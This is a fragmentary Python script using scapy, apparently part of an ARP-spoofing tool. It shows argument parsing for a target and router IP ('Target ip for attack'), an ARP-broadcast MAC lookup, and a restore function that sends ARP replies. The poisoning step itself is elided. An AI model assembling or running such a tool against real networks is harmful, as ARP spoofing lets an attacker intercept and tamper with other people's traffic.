...
def get_options():
    ...
    parser.add_argument("-t", "--target", dest="target_ip",
                        help="Target ip for for attack")
    parser.add_argument("-r", "--router", dest="router_ip",
                        help="Router or ethernet ip")
...
def get_mac(ip):
    ...
    # get a mac address of our computer
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_brodcast = broadcast/arp_request  # arp_request + broadcast
    answered_list = scapy.srp(arp_request_brodcast,
...
def restore(destionation_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destionation_ip, hwdst=get_mac(
        destionation_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False)
